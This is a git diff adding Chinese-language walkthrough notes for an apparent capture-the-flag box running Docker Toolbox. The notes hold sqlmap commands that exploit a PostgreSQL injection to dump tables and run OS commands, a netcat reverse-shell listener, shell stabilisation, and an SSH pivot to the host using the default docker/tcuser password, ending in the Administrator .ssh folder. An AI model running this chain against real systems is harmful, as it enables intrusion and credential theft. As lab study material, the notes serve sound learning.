@@ -1,5 +1,6 @@
 ## Toolbox
 ### Docker-Toolbox 运行的是 boot2docker Linux 发行版。该发行版中 docker 用户的默认密码是什么？docker/tcuser
+#### docker-toolbox有默认情况下访问c:\Users文件夹，该文件夹挂载在/c/Users
 ```
 docker@box:/$ cat /etc/os-release                                              
 NAME=Boot2Docker
@@ -12,6 +13,53 @@ ANSI_COLOR="1;34"
 HOME_URL="https://github.com/boot2docker/boot2docker"
 SUPPORT_URL="https://blog.docker.com/2016/11/introducing-docker-community-directory-docker-community-slack/"
 BUG_REPORT_URL="https://github.com/boot2docker/boot2docker/issues"
+```
+### 总结
+#### 从frp 看到docker-toolbox.exe提示了与docker有关
+```
+//把真实的登录请求交给 sqlmap 去自动测试 SQL 注入
+[★]$ sqlmap -r toolbox.req --force-ssl --batch
+[★]$ sqlmap -r toolbox.req --force-ssl --batch -D public --tables
+[★]$ sqlmap -r toolbox.req --force-ssl --batch -D public -T users --dump
+[★]$ sqlmap -r toolbox.req --force-ssl --batch --os-cmd whoami
+[★]$ sqlmap -r toolbox.req --force-ssl --batch --os-cmd id
+//* 是哪种注入方式（boolean / time / error / stacked）,
+//是 PostgreSQL 的多类型注入点👉 包括：布尔盲注 + 报错注入 + 时间盲注 + 堆叠查询
+
+[★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+
+[★]$ sqlmap -r toolbox.req --force-ssl --batch --os-shell
+
+
+
+[★]$ sudo nc -lvnp 443
+postgres@bc56e3cc55e9:/$ python3 -c 'import pty;pty.spawn("bash")'
+postgres@bc56e3cc55e9:/$ ^Z
+[★]$ stty raw -echo; fg
+sudo nc -lvnp 443
+                 reset
+
+
+
+postgres@bc56e3cc55e9:/var/lib/postgresql$ ifconfig eth0
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
+
+
+postgres@bc56e3cc55e9:/$ python3 -c "import pty;pty.spawn('/bin/bash')"
+postgres@bc56e3cc55e9:/$ ssh docker@172.17.0.1
+docker@172.17.0.1's password: tcuser
+
+docker@box:~$ sudo -l                                                          
+User docker may run the following commands on this host:
+    (root) NOPASSWD: ALL
+docker@box:~$ whoami                                                           
+docker
+
+docker@box:~$ cd  /c/Users   
+docker@box:/c/Users$ cd Administrator
+docker@box:/c/Users/Administrator$ cd .ssh  
 ```
 ```
 [★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.96.171 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
